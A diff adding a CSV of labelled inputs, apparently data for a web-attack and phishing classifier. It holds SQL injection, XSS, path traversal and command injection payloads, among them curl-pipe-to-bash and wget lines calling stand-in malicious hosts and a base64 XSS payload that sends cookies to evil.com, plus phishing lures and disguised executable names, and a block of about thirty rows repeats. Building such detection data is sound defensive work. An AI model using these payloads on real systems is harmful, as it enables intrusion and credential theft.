@@ -1,0 +1,189 @@
+input,label
+admin,bruteforce
+admin123,bruteforce
+password123,bruteforce
+login attempt,normal
+hello,normal
+user login,normal
+select * from users,sqli
+admin' OR 1=1,sqli
+DROP TABLE users,sqli
+whoami,command_injection
+ls -la,command_injection
+cat /etc/passwd,path_traversal
+../../../../etc/passwd,path_traversal
+../../../windows/system32/cmd.exe,path_traversal
+/var/www/html/../../../etc/shadow,path_traversal
+; rm -rf /,command_injection
+& format C:,command_injection
+| wget http://evil.com/malware,command_injection
+<script>alert(1)</script>,xss
+<img src=x onerror=alert('XSS')>,xss
+javascript:alert(document.cookie),xss
+<svg/onload=alert(1)>,xss
+' OR '1'='1' --,sqli
+" OR ""=""",sqli
+"UNION SELECT username, password FROM admin",sqli
+admin' #,sqli
+ping -c 4 127.0.0.1;,command_injection
+$(whoami),command_injection
+`id`,command_injection
+123456,bruteforce
+qwerty,bruteforce
+root,bruteforce
+page=../../../../etc/hosts,path_traversal
+file=C:\Windows\System32\drivers\etc\hosts,path_traversal
+dir,command_injection
+ipconfig,command_injection
+net user,command_injection
+index.html,normal
+contact.html,normal
+get users info,normal
+<body onload=alert('XSS')>,xss
+"<iframe src=""javascript:alert(1)"">",xss
+SELECT pg_sleep(10),sqli
+WAITFOR DELAY '0:0:10',sqli
+<sCrIpt>alert(1)</sCrIpt>,xss
+%3Cscript%3Ealert(1)%3C%2Fscript%3E,xss
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,xss
+eval(atob('YWxlcnQoMSk=')),xss
+javascript:eval(atob('YWxlcnQoMSk=')),xss
+"<svg/onload=eval(atob(""YWxlcnQoMSk=""))>",xss
+"UNION/**/SELECT/**/1,2,3",sqli
+uNiOn SeLeCt,sqli
+%55%4E%49%4F%4E%20%53%45%4C%45%43%54,sqli
+' or '1'='1' -- -,sqli
+admin' /*!OR*/ 1=1 --,sqli
+' OR 1=1#,sqli
+1; DROP TABLE users;,sqli
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,path_traversal
+..%2f..%2f..%2fetc%2fpasswd,path_traversal
+....//....//....//etc//passwd,path_traversal
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd,path_traversal
+\..\..\..\windows\system32\cmd.exe,path_traversal
+"cat /e""t""c/pas""sw""d",command_injection
+c\at /etc/passwd,command_injection
+$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d),command_injection
+`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh`,command_injection
+"w""h""o""a""m""i",command_injection
+;ls -lA;,command_injection
+| id,command_injection
+& type C:\Windows\System32\drivers\etc\hosts,command_injection
+"<!--#exec cmd=""ls"" -->",command_injection
+<scr\x00ipt>alert(1)</scr\x00ipt>,xss
+' or 1=1;waitfor delay '0:0:5'--,sqli
+1'; WAITFOR DELAY '0:0:10'--,sqli
+sleep(10),sqli
+"<a href=""javascript:alert(1)"">Click</a>",xss
+' OR 'a'='a,sqli
+admin' OR '1'='1'/*,sqli
+../../../../../../../../etc/shadow,path_traversal
+/var/www/html/../../../../etc/passwd,path_traversal
+; wget http://malicious.com ,command_injection
+| curl http://malicious.com/shell.sh | bash,command_injection
+"<iframe src=""javascript:alert(2)"">",xss
+"<object data=""javascript:alert(3)"">",xss
+"1 UNION ALL SELECT NULL, NULL, NULL",sqli
+"' AND 1=0 UNION ALL SELECT table_name, column_name FROM information_schema.columns",sqli
+"?id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT VERSION()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",sqli
+"<body onload=eval(atob(""YWxlcnQoMSk=""))>",xss
+resume.pdf.exe,file_upload_attack
+urgent_invoice.docx.exe,file_upload_attack
+tax_return_2025.pdf.scr,file_upload_attack
+bonus_claim_form.xls.exe,file_upload_attack
+Click here to reset your compromised password,suspicious
+Your account has been suspended. Verify now at http://evil.com/login,suspicious
+You have won a free iPhone. Click here to claim,suspicious
+Action Required: Update your billing information,suspicious
+IT Helpdesk: Please install this urgent security patch,suspicious
+security_patch_v2.exe,file_upload_attack
+Annual_Performance_Review.pdf.jar,file_upload_attack
+Meeting_Notes_Q3.doc.vbs,file_upload_attack
+Important Bank Alert: Unauthorized login attempt,suspicious
+CEO Request: Can you process a wire transfer immediately?,suspicious
+Exclusive offer for loyal customers only,suspicious
+Your package delivery failed. Check tracking info here,suspicious
+You have 1 new unread voicemail,suspicious
+Confidential_Salary_Report.xlsx.exe,file_upload_attack
+Please review the attached contract,suspicious
+Warning: Your mailbox is almost full,suspicious
+HR Document: Employee Benefits Update,suspicious
+Admin password reset requested. Ignore if not you.,suspicious
+Employee_Handbook_Updated.pdf.exe,file_upload_attack
+Re: Invoice #49281 payment overdue,suspicious
+Claim your Amazon gift card now,suspicious
+Account disabled. Login to reactivate,suspicious
+Urgent: Action needed on your account,suspicious
+FWD: Customer complaint regarding your recent service,suspicious
+Confidential merger details attached,suspicious
+Please confirm your travel itinerary,suspicious
+eval(atob('YWxlcnQoMSk=')),xss
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,xss
+javascript:eval(atob('YWxlcnQoMSk=')),xss
+<svg/onload=eval(atob('YWxlcnQoMSk='))>,xss
+resume.pdf.exe,file_upload_attack
+urgent_invoice.docx.exe,file_upload_attack
+tax_return_2025.pdf.scr,file_upload_attack
+bonus_claim_form.xls.exe,file_upload_attack
+Click here to reset your compromised password,suspicious
+Your account has been suspended. Verify now at http://evil.com/login,suspicious
+You have won a free iPhone. Click here to claim,suspicious
+Action Required: Update your billing information,suspicious
+IT Helpdesk: Please install this urgent security patch,suspicious
+security_patch_v2.exe,file_upload_attack
+Annual_Performance_Review.pdf.jar,file_upload_attack
+Meeting_Notes_Q3.doc.vbs,file_upload_attack
+Important Bank Alert: Unauthorized login attempt,suspicious
+CEO Request: Can you process a wire transfer immediately?,suspicious
+Exclusive offer for loyal customers only,suspicious
+Your package delivery failed. Check tracking info here,suspicious
+You have 1 new unread voicemail,suspicious
+Confidential_Salary_Report.xlsx.exe,file_upload_attack
+Please review the attached contract,suspicious
+Warning: Your mailbox is almost full,suspicious
+HR Document: Employee Benefits Update,suspicious
+Admin password reset requested. Ignore if not you.,suspicious
+Employee_Handbook_Updated.pdf.exe,file_upload_attack
+Re: Invoice #49281 payment overdue,suspicious
+Claim your Amazon gift card now,suspicious
+Account disabled. Login to reactivate,suspicious
+Urgent: Action needed on your account,suspicious
+FWD: Customer complaint regarding your recent service,suspicious
+Confidential merger details attached,suspicious
+Please confirm your travel itinerary,suspicious
+<script>eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbS8/Yz0iK2RvY3VtZW50LmNvb2tpZQ=='))</script>,xss
+javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbS8/Yz0iK2RvY3VtZW50LmNvb2tpZQ==')),xss
+payload.sh,file_upload_attack
+shell.php.jpg,file_upload_attack
+backdoor.jsp,file_upload_attack
+cmd.asp,file_upload_attack
+login_portal_update.zip,file_upload_attack
+System_Critical_Update.exe,file_upload_attack
+payroll_december.pdf.bat,file_upload_attack
+budget_2026.xlsx.msi,file_upload_attack
+Your Netflix subscription has expired,suspicious
+Verify your PayPal account immediately,suspicious
+Security Alert: Unusual sign-in activity detected,suspicious
+Unpaid toll notice. Pay now to avoid fees.,suspicious
+"Congratulations! You are our 1,000,000th visitor",suspicious
+Your antivirus protection has expired. Renew now.,suspicious
+IRS Notification: Final Notice of Tax Evasion,suspicious
+Final warning: Your domain name is about to expire,suspicious
+Upgrade your mailbox capacity now,suspicious
+You have been mentioned in a new document,suspicious
+Action required: Sign the new company policy,suspicious
+Wire transfer receipt #84729 attached,suspicious
+Your order has been shipped. Track it here.,suspicious
+Refund to your credit card failed. Please update info.,suspicious
+You have a new direct message from HR,suspicious
+Access to your Office365 account is blocked,suspicious
+Please review the latest project proposal,suspicious
+Login attempt from a new device in Russia,suspicious
+Document shared with you on OneDrive,suspicious
+Your IT ticket has been updated,suspicious
+Zoom meeting invitation: Q4 Earnings Call,suspicious
+Voicemail from generic caller,suspicious
+Please download the attached NDA,suspicious
+Payment confirmation for order #99281,suspicious
+Your email account will be deleted in 24 hours,suspicious
+Important message from the CEO,suspicious
